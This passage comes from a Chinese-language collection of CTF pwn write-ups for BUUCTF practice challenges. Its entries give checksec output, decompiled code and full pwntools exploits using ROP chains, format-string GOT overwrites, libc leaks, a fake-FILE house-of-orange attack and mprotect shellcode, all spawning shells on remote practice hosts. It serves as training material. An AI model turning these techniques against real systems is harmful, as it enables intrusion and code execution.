_shortbuf[1]; _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 偏移0x20处为IO_write_base,偏移0x28处为IO_write_ptr,偏移0xc8处为_mode,偏移0xd8处为ptr_vtable 绕过检测： 1._mode&lt;=0 2._IO_write_base&lt;IO_write_ptr 最终的结构体 12345678910111213141516payload = &quot;a&quot;*0x400payload += p64(0)+p64(0x21)+&#x27;a&#x27;*0x10fake_file = p64(0)+p64(0x60)#利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58(即&amp;unsorted_bin+0x10)fake_file += p64(0)+p64(IO_list_all-0x10)fake_file += p64(0)+p64(1)fake_file += p64(0)+p64(binsh)fake_file = fake_file.ljust(0xc0,&#x27;\\x00&#x27;)payload += fake_filepayload += p64(0)*3payload += p64(IO_str_jumps-0x8)payload += p64(0)payload += p64(system_addr) #jump2here 12345678unsortedbinall [corrupted]FD: 0x55b6afcad510 ◂— 0x0BK: 0x55b6afcad510 —▸ 0x7f0850d77510 ◂— 0x0pwndbg&gt; x/12gx 0x7f0850d775100x7f0850d77510: 0x0000000000000000 0x00000000000000000x7f0850d77520 &lt;_IO_list_all&gt;: 0x00007f0850d77540 0x00000000000000000x7f0850d77530: 0x0000000000000000 0x0000000000000000 已经迁移IO_list_all EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# -*- coding: utf-8 -*- from pwn import *#context.log_level =&quot;debug&quot;elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)p = 0def connect(ip,port,mode): global p if mode == 1: p = process(&quot;./houseoforange_hitcon_2016&quot;) else: p = remote(ip,port)def add(sz,name): p.sendlineafter(&quot;: &quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,name) p.sendlineafter(&quot;:&quot;,&quot;10&quot;) p.sendlineafter(&quot;:&quot;,&quot;3&quot;)def see(): p.sendlineafter(&quot;: &quot;,&quot;2&quot;)def edit(sz,text): p.sendlineafter(&quot;: &quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text) p.sendlineafter(&quot;:&quot;,&quot;3&quot;)def pwn():#------------House_of_orange------------ add(0x30,&#x27;a&#x27;*8) payload = &#x27;a&#x27;*0x30+p64(0)+p64(0x21)+&#x27;a&#x27;*0x10+p64(0)+p64(0xf81) edit(len(payload),payload) add(0x1000,&#x27;b&#x27;) add(0x400,&#x27;c&#x27;*8) see() leak = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) log.success(&quot;leak add =&gt; 0x%x&quot;,leak)#------------Unsoted_bin leak------------ libc_base = leak-0x3c510a system_addr = libc_base+libc.sym[&quot;system&quot;] binsh = libc_base+libc.search(&quot;/bin/sh\\x00&quot;).next() IO_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;] IO_str_jumps = libc.symbols[&quot;_IO_file_jumps&quot;]+0xc0+libc_base log.success(&quot;libc base =&gt; 0x%x&quot;,libc_base) log.success(&quot;system addr =&gt; 0x%x&quot;,system_addr) log.success(&quot;IO list all =&gt; 0x%x&quot;,IO_list_all) log.success(&quot;IO str jump =&gt; 0x%x&quot;,IO_str_jumps)#------------Fake FILE------------ payload = &quot;a&quot;*0x400 payload += p64(0)+p64(0x21)+&#x27;a&#x27;*0x10 fake_file = p64(0)+p64(0x60) #利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58(即&amp;unsorted_bin+0x10) fake_file += p64(0)+p64(IO_list_all-0x10) fake_file += p64(0)+p64(1) fake_file += p64(0)+p64(binsh) fake_file = fake_file.ljust(0xc0,&#x27;\\x00&#x27;) payload += fake_file payload += p64(0)*3 payload += p64(IO_str_jumps-0x8) payload += p64(0) payload += p64(system_addr) #jump2here edit(0x800,payload) p.recv() p.sendline(&quot;1&quot;) p.sendline(&quot;1&quot;) p.interactive()if __name__ == &#x27;__main__&#x27;: connect(&quot;node3.buuoj.cn&quot;,29891,1) pwn() inndy_echo 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 1234567891011121314151617int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do &#123; fgets(&amp;s, 0x100, stdin); printf(&amp;s); &#125; while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); exit(0);&#125; 字符串格式化漏洞，没有栈溢出，利用任意地址写把printf@got改为system@plt 3.EXP 12345678910111213from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./echo&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;29921&quot;)printf_got_addr = elf.got[&quot;printf&quot;]system_plt_addr = elf.plt[&quot;system&quot;]payload = fmtstr_payload(7,&#123;printf_got_addr: system_plt_addr&#125;)p.sendline(payload)p.sendline(&quot;$0&quot;)p.interactive() inndy_rop 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA overflow 123456int overflow()&#123; char v1; // [esp+Ch] [ebp-Ch] return gets(&amp;v1);&#125; 函数复杂，有溢出，直接自动生成ropchain 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from struct import packcontext.log_level = &quot;debug&quot;#q = process(&#x27;./rop&#x27;)q = remote(&quot;node3.buuoj.cn&quot;,&quot;28171&quot;)context.log_level = &#x27;debug&#x27;def payload(): p = &#x27;a&#x27;*0xc + &#x27;bbbb&#x27; p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret p += &#x27;/bin&#x27; p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4 p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret p += &#x27;//sh&#x27; p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8 p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data p += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8 p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8 p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret p += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80 return pshell = payload()q.sendline(shell)q.interactive() jarvisoj_fm 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456789101112131415161718int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+2Ch] [ebp-5Ch] unsigned int v5; // [esp+7Ch] [ebp-Ch] v5 = __readgsdword(0x14u); be_nice_to_people(); memset(&amp;buf, 0, 0x50u); read(0, &amp;buf, 0x50u); printf(&amp;buf); printf(&quot;%d!\\n&quot;, x); if ( x == 4 ) &#123; puts(&quot;running sh...&quot;); system(&quot;/bin/sh&quot;); &#125; return 0;&#125; 利用字符串格式化漏洞改x为4 3.EXP 123456789from pwn import *context.log_level = &quot;debug&quot;#p = remote(&quot;node3.buuoj.cn&quot;,26472)p = process(&quot;./fm&quot;)elf = ELF(&quot;./fm&quot;)x_addr = 0x0804A02Cpayload = p32(x_addr)+&quot;%11$n&quot;p.sendline(payload)p.interactive() jarvisoj_guess Socket原理讲解 下标越界导致盲注 1.checksec 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA is_flag_correct 123456789101112131415161718 qmemcpy(bin_by_hex, &amp;unk_401100, sizeof(bin_by_hex)); qmemcpy(flag, &quot;FAKE&#123;9b355e394d2070ebd0df195d8b234509cc29272bc412&#125;&quot;, sizeof(flag)); bzero(given_flag, 0x32uLL); for ( i = 0; i &lt;= 0x31; ++i ) &#123; value1 = bin_by_hex[flag_hex[2 * i]]; value2 = bin_by_hex[flag_hex[2 * i + 1]]; if ( value1 == -1 || value2 == -1 ) &#123; puts(&quot;bad input – one of the characters you supplied was not a valid hex character!&quot;); exit(0); &#125; given_flag[i] = value2 | 16 * value1; &#125; diff = 0; for ( i_0 = 0; i_0 &lt;= 49; ++i_0 ) diff |= flag[i_0] ^ given_flag[i_0]; return diff == 0; 其中 flag 是之前 qmemcpy过后的，given_flag是通过 value_1 和 value_2 的值计算来的，而这两个值是由我们输入的flag决定，如果控制 flag_hex[2 * i] 为负数，就可以flag结果修改为正确的flag结果，这样就可以通过后面的检测了 is_flag_correct -&gt; stack 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455-00000000000001A0-00000000000001A0 db ? ; undefined-000000000000019F db ? ; undefined-000000000000019E db ? ; undefined-000000000000019D db ? ; undefined-000000000000019C db ? ; undefined-000000000000019B db ? ; undefined-000000000000019A db ? ; undefined-0000000000000199 db ? ; undefined-0000000000000198 flag_hex dq ? ; offset-0000000000000190 given_flag db 50 dup(?)-000000000000015E db ? ; undefined-000000000000015D db ? ; undefined-000000000000015C db ? ; undefined-000000000000015B db ? ; undefined-000000000000015A db ? ; undefined-0000000000000159 db ? ; undefined-0000000000000158 db ? ; undefined-0000000000000157 db ? ; undefined-0000000000000156 db ? ; undefined-0000000000000155 db ? ; undefined-0000000000000154 db ? ; undefined-0000000000000153 db ? ; undefined-0000000000000152 db ? ; undefined-0000000000000151 db ? ; undefined-0000000000000150 flag db 50 dup(?)-000000000000011E db ? ; undefined-000000000000011D db ? ; undefined-000000000000011C db ? ; undefined-000000000000011B db ? ; undefined-000000000000011A db ? ; undefined-0000000000000119 db ? ; undefined-0000000000000118 db ? ; undefined-0000000000000117 db ? ; undefined-0000000000000116 db ? ; undefined-0000000000000115 db ? ; undefined-0000000000000114 db ? ; undefined-0000000000000113 db ? ; undefined-0000000000000112 db ? ; undefined-0000000000000111 db ? ; undefined-0000000000000110 bin_by_hex db 256 dup(?)-0000000000000010 db ? ; undefined-000000000000000F db ? ; undefined-000000000000000E value2 db ?-000000000000000D value1 db ?-000000000000000C i_0 dd ?-0000000000000008 db ? ; undefined-0000000000000007 db ? ; undefined-0000000000000006 db ? ; undefined-0000000000000005 diff db ?-0000000000000004 i dd ?+0000000000000000 s db 8 dup(?)+0000000000000008 r db 8 dup(?)+0000000000000010+0000000000000010 ; end of stack variables char的范围一般是0~255，这里有整数溢出，190+∣−66∣=256190+|-66|=256190+∣−66∣=256，这种都行 1234payload = &#x27;&#x27;for i in range(50): payload += &#x27;0&#x27; payload += p8(0x100-0x40 + i) 这样的payload就可以通过检测了，然后逐字节爆破 1234567891011121314sh = remote(&#x27;node3.buuoj.cn&#x27;,26493)flag = &#x27;&#x27;for i in range(1,51): print &quot;guess the index &#123;&#125;&#x27;s char&quot;.format(i) for c in range(32,128): pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:] sh.sendlineafter(&#x27;guess&gt; &#x27;,pay) ans = sh.recvuntil(&#x27;\\n&#x27;) if &#x27;Yaaaay!&#x27; in ans: flag += chr(c) break print &#x27;flag=&#x27;,flag sh.close() 3.EXP 12345678910111213141516171819202122from pwn import *#bypasspayload = &#x27;&#x27;for i in range(50): payload += &#x27;0&#x27; payload += p8(0x100-0x40 + i) #exploitsh = remote(&#x27;node3.buuoj.cn&#x27;,26493)flag = &#x27;&#x27;for i in range(1,51): print &quot;guess the index &#123;&#125;&#x27;s char&quot;.format(i) for c in range(32,128): pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:] sh.sendlineafter(&#x27;guess&gt; &#x27;,pay) ans = sh.recvuntil(&#x27;\\n&#x27;) if &#x27;Yaaaay!&#x27; in ans: flag += chr(c) break print &#x27;flag&gt;&#x27;,flagsh.close() jarvisoj_typo 1.checksec Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) 发现是arm架构的pwn jarvisoj_level0 环境：Ubuntu16 1.checksec 123456[*] &#x27;/home/o Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 2.IDA main 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; write(1, &quot;Hello, World\\n&quot;, 0xDuLL); return vulnerable_function(1LL, &quot;Hello, World\\n&quot;);&#125; vulnerable_function 123456ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x200uLL);&#125; 简单溢出，且含有system binsh 3.EXP 1234567from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28704)binsh = 0x040059Apayload = &#x27;a&#x27;*0x88 + p64(binsh)p.sendlineafter(&quot;\\n&quot;,payload)p.interactive() jarvisoj_level2 环境：Ubuntu：16 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); system(&quot;echo &#x27;Hello World!&#x27;&quot;); return 0;&#125; vulnerable_function 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] system(&quot;echo Input:&quot;); return read(0, &amp;buf, 0x100u);&#125; 有system和binsh 3.EXP 12345678910111213from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26265)#p= process(&quot;./level2&quot;)sys_addr = 0x0804845Cbinsh = 0x0804A024payload = &#x27;a&#x27;*(0x88+4)payload += p32(sys_addr) + p32(binsh)p.sendlineafter(&quot;:&quot;,payload)p.interactive() system只能选取已经执行过的system jarvisoj_level3 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function 1234567ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] write(1, &quot;Input:\\n&quot;, 7u); return read(0, &amp;buf, 0x100u);&#125; 栈溢出，需要找到libc 3.EXP 12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26281)elf = ELF(&quot;./level3&quot;)libc_start = elf.sym[&quot;__libc_start_main&quot;]libc_start_got = elf.got[&quot;__libc_start_main&quot;]write_plt = elf.plt[&quot;write&quot;]write_got = elf.got[&quot;write&quot;]start_addr = 0x08048350p1 = &#x27;a&#x27;*0x88+&#x27;aaaa&#x27;p1 += p32(write_plt)+p32(start_addr)p1 += p32(1)+p32(write_got)+p32(4)p.sendlineafter(&quot;:\\n&quot;,p1)write_real = u32(p.recv(4))libc = LibcSearcher(&quot;write&quot;,write_real)libc_base = write_real - libc.dump(&quot;write&quot;)print &quot;libc_base=&gt;&quot;+hex(libc_base)sys_addr = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)p1 = &#x27;a&#x27;*(0x88+4)p1 += p32(sys_addr)+p32(0)+p32(binsh)p.sendlineafter(&quot;:\\n&quot;,p1)p.interactive() jarvisoj_level3_x64 1.checksec 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); return write(1, &quot;Hello, World!\\n&quot;, 0xEuLL);&#125; vulnerable_function 1234567ssize_t vulnerable_function()&#123; char buf; // [rsp+0h] [rbp-80h] write(1, &quot;Input:\\n&quot;, 7uLL); return read(0, &amp;buf, 0x200uLL);&#125; read 溢出+libc_leak 3.EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,27722)elf = ELF(&quot;./level3_x64&quot;)read_got = elf.got[&#x27;read&#x27;]write_plt = elf.plt[&#x27;write&#x27;]vuln_addr = elf.sym[&quot;vulnerable_function&quot;]pop_rdi_ret = 0x04006b3pop_rsi_r15_ret = 0x04006b1pop_rbp_ret = 0x0400550&#x27;&#x27;&#x27;0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop r14 ; pop r15 ; ret0x00000000004006b2 : pop r15 ; ret0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400550 : pop rbp ; ret0x00000000004006b3 : pop rdi ; ret0x00000000004006b1 : pop rsi ; pop r15 ; ret0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400499 : ret&#x27;&#x27;&#x27;payload = &#x27;a&#x27;*(0x80+8)payload += p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(0)payload += p64(write_plt)+p64(vuln_addr)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload)read_real = u64(p.recv(8))libc = LibcSearcher(&quot;read&quot;,read_real)libc_base = read_real - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.info(&quot;libc base==&gt;%s&quot;,hex(libc_base))log.info(&quot;system addr==&gt;%s&quot;,hex(sys_addr))log.info(&quot;/bin/sh addr==&gt;%s&quot;,hex(binsh))payload = &#x27;a&#x27;*(0x80+8)payload += p64(pop_rdi_ret)+p64(binsh)+p64(sys_addr)+p64(vuln_addr)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload)p.interactive() jarvisoj_level4 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); write(1, &quot;Hello, World!\\n&quot;, 0xEu); return 0;&#125; vulnerable_function 123456ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u);&#125; 这题本意是然大家用Dynefl来泄露libc的，但是LibcSearcher一样可以 3.EXP 3.1 libcsearcher 12345678910111213141516171819202122232425262728from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28393)elf = ELF(&quot;./level4&quot;)libc_start_main = elf.got[&quot;__libc_start_main&quot;]write_plt = elf.plt[&#x27;write&#x27;]main_addr = elf.sym[&#x27;main&#x27;]payload = &#x27;a&#x27;*(0x88+4)payload += p32(write_plt)+p32(main_addr)+p32(1)+p32(libc_start_main)p.sendline(payload)libc_start_real = u32(p.recv(4))libc = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_real)libc_base = libc_start_real - libc.dump(&quot;__libc_start_main&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.info(&quot;libc base=&gt;%s&quot;,hex(libc_base))log.info(&quot;system addr=&gt;%s&quot;,hex(sys_addr))log.info(&quot;binsh addr=&gt;%s&quot;,hex(binsh))payload = &#x27;a&#x27;*(0x88+4)payload += p32(sys_addr)+p32(0xdeadbeef)+p32(binsh)p.sendline(payload)p.interactive() 3.2 Dynelf 12345678910111213141516171819202122from pwn import *io=remote(&quot;node3.buuoj.cn&quot;,28393)elf=ELF(&quot;./level4&quot;)vulner_function_address=0x804844Bwrite_plt=elf.plt[&quot;write&quot;]read_plt=elf.plt[&quot;read&quot;]bss_addr=0x0804a024def leak(address): payload=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(write_plt)+p32(vulner_function_address)+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or &#x27;&#x27;).encode(&#x27;hex&#x27;)) return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;./level4&quot;))sys_addr=d.lookup(&quot;system&quot;,&quot;libc&quot;)print hex(sys_addr)payload1=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(read_plt)+p32(vulner_function_address)+p32(1)+p32(bss_addr)+p32(8)io.sendline(payload1)io.sendline(&quot;/bin/sh&quot;)payload2=&quot;a&quot;*0x88+&quot;aaaa&quot;+p32(sys_addr)+p32(vulner_function_address)+p32(bss_addr)io.sendline(payload2)io.interactive() jarvisoj_level5 buu上给的就是jarvisoj_level3_x64 jarvisoj_tell_me_something 1.checksec 12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v4; // [rsp+0h] [rbp-88h] write(1, &quot;Input your message:\\n&quot;, 0x14uLL); read(0, &amp;v4, 0x100uLL); return write(1, &quot;I have received your message, Thank you!\\n&quot;, 0x29uLL);&#125; good_game 1234567891011121314151617int good_game()&#123; FILE *v0; // rbx int result; // eax char buf; // [rsp+Fh] [rbp-9h] v0 = fopen(&quot;flag.txt&quot;, &quot;r&quot;); while ( 1 ) &#123; result = fgetc(v0); buf = result; if ( (_BYTE)result == -1 ) break; write(1, &amp;buf, 1uLL); &#125; return result;&#125; 自行读取flag，不嫌麻烦也可试试open/read/write 3.EXP 12345678910from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29781)elf = ELF(&quot;./guestbook&quot;)payload = &#x27;a&#x27;*0x88 + p64(0x0400620)p.recvuntil(&quot;message:&quot;)p.sendline(payload)print p.recv()p.interactive() jarvisoj_test_your_memory 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax char s2[11]; // [esp+1Dh] [ebp-13h] int v6; // [esp+28h] [ebp-8h] int i; // [esp+2Ch] [ebp-4h] v6 = 10; puts(&quot;\\n\\n\\n------Test Your Memory!-------\\n&quot;); v3 = time(0); srand(v3); for ( i = 0; i &lt; v6; ++i ) s2[i] = alphanum_2626[rand() % 0x3Eu]; printf(&quot;%s&quot;, s2); mem_test(s2); return 0;&#125;//.rodata:08048860 alphanum_2626 db 30h ; DATA XREF: main+5F↑r//.rodata:08048861 a123456789abcde db &#x27;123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;,0 产生随机数，然后让我们来猜 mem_test 12345678910111213141516171819int __cdecl mem_test(char *s2)&#123; int result; // eax char s; // [esp+15h] [ebp-13h] memset(&amp;s, 0, 0xBu); puts(&quot;\\nwhat???? : &quot;); printf(&quot;0x%x \\n&quot;, hint); puts(&quot;cff flag go go go ...\\n&quot;); printf(&quot;&gt; &quot;); __isoc99_scanf(&quot;%s&quot;, &amp;s); if ( !strncmp(&amp;s, s2, 4u) ) result = puts(&quot;good job!!\\n&quot;); else result = puts(&quot;cff flag is failed!!\\n&quot;); return result;&#125;//.data:0804A040 hint dd offset aCatFlag ; DATA XREF: mem_test+2D↑r//.data:0804A040 _data ends ; &quot;cat flag&quot; 验证我们的输入，并且有了栈溢出和cat flag的地址 win_func 1234int __cdecl win_func(char *command)&#123; return system(command);&#125; 后门函数，作用==system 3.EXP 123456789101112from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,28178)elf = ELF(&quot;./memory&quot;)cat_flag = 0x80487e0payload = &#x27;a&#x27;*(0x13+4)payload += p32(elf.sym[&quot;win_func&quot;])+p32(cat_flag)payload += p32(cat_flag)p.sendline(payload)p.interactive() not_the_same_3dctf_2016 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+Fh] [ebp-2Dh] printf(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;); gets(&amp;v4); return 0;&#125; 简单栈溢出，但是远程开启了段保护，所以用ROP取消段保护 3.EXP 123456789101112131415from pwn import *p=process(&#x27;./not_the_same_3dsctf_2016&#x27;)p = remote(&quot;node3.buuoj.cn&quot;,28930)elf=ELF(&#x27;./not_the_same_3dsctf_2016&#x27;)payload=&#x27;a&#x27;*0x2d+p32(elf.symbols[&#x27;mprotect&#x27;])payload+=p32(0x0809e3e5)payload+=p32(0x080EB000)payload+=p32(0x1000)+p32(0x7)payload+=p32(elf.symbols[&#x27;read&#x27;])payload+=p32(0x0809e3e5)+p32(0)+p32(0x080EBF80)+p32(0x100)+p32(0x080EBF80)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() others_babystack 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 两个主要功能 123456def store(text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendline(text)def Print(): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;) main 1234567891011121314151617181920212223242526272829303132__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax char s; // [rsp+10h] [rbp-90h] unsigned __int64 v6; // [rsp+98h] [rbp-8h] v6 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); memset(&amp;s, 0, 0x80uLL); while ( 1 ) &#123; menu(); v3 = READ(); switch ( v3 ) &#123; case 2: puts(&amp;s); break; case 3: return 0LL; case 1: read(0, &amp;s, 0x100uLL); break; default: PUTS(&quot;invalid choice&quot;); break; &#125; PUTS((const char *)&amp;unk_400AE7); &#125;&#125; 24行的read有一个短小的溢出，从这里我们使用19行的puts可以泄露canary的值，为之后更长的rop-chain做准备 3.EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;babystack&quot;)#p = process(&quot;./babystack&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;28311&quot;)def store(text): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;) p.sendline(text)def Print(): p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)pop_rdi_ret = 0x0400a93puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]main = 0x0400908if __name__ == &#x27;__main__&#x27;: store(&#x27;a&#x27;*0x88) Print() p.recvuntil(&#x27;a\\n&#x27;) canary=u64(p.recv(7).rjust(8,&#x27;\\x00&#x27;)) log.success(&quot;canary =&gt;0x%x&quot;,canary) payload = &#x27;a&#x27;*0x88+p64(canary)+&#x27;b&#x27;*8 payload += p64(pop_rdi_ret)+p64(puts_got) payload += p64(puts_plt)+p64(main) store(payload) p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;) p.recv() puts_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;)) libc = LibcSearcher(&quot;puts&quot;,puts_addr) base = puts_addr-libc.dump(&quot;puts&quot;) sys_addr = libc.dump(&quot;system&quot;)+base binsh = libc.dump(&quot;str_bin_sh&quot;)+base log.success(&quot;puts real =&gt;0x%x&quot;,puts_addr) log.success(&quot;libc base =&gt;0x%x&quot;,base) log.success(&quot;system addr=&gt;0x%x&quot;,sys_addr) log.success(&quot;/bin/sh =&gt;0x%x&quot;,binsh) payload = &#x27;a&#x27;*0x88+p64(canary)+&#x27;b&#x27;*8 payload += 